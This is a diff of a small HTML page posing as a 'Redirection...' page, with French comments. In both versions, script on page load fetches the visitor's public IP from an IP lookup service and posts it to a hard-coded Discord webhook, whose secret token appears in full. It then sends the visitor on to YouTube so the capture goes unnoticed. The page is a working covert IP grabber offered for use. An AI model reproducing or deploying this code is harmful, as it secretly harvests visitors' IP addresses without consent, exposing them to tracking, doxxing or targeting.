@@ -1,47 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirection en cours...</title>
-    <script>
-        var ip = '';
-        var currentDateTime = new Date().toISOString().slice(0, 19).replace('T', ' ');
-
-        function getIpAddress() {
-            fetch('https://api.ipify.org/?format=json')
-                .then(function(response) {
-                    return response.json();
-                })
-                .then(function(data) {
-                    ip = data.ip;
-                    sendWebhook();
-                });
-        }
-
-        function sendWebhook() {
-            var webhook = 'https://discord.com/api/webhooks/1126222435860107304/P8OUTmVfXEUBYnOy-rdpgdIaOYPzvzw9pJPfl_X8hLOi1yQEVRHaHaAmkz5Vdws69rwO';
-
-            var message = {
-                content: 'IP Address: ' + ip
-            };
-
-            fetch(webhook, {
-                method: 'POST',
-                headers: {
-                    'content-type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            });
-        }
-
-        setTimeout(function() {
-            getIpAddress();
-            window.location.href = "https://www.youtube.com";
-        }, 1100);
-    </script>
+  <title>Redirection...</title>
 </head>
 <body>
-    <h1></h1>
+
+  <script>
+    var ip = '';
+    fetch('https://api.ipify.org/?format=json')
+      .then(function(response) {
+        return response.json();
+      })
+      .then(function(data) {
+        ip = data.ip;
+        var webhook = 'https://discord.com/api/webhooks/1126222435860107304/P8OUTmVfXEUBYnOy-rdpgdIaOYPzvzw9pJPfl_X8hLOi1yQEVRHaHaAmkz5Vdws69rwO';
+        var message = {
+          content: 'IP: ' + ip
+        };
+        fetch(webhook, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(message)
+        });
+      });
+
+    // Redirection vers YouTube après 3 secondes
+    setTimeout(function() {
+      window.location.href = 'https://www.youtube.com';
+    }, 3000);
+  </script>
+
 </body>
 </html>
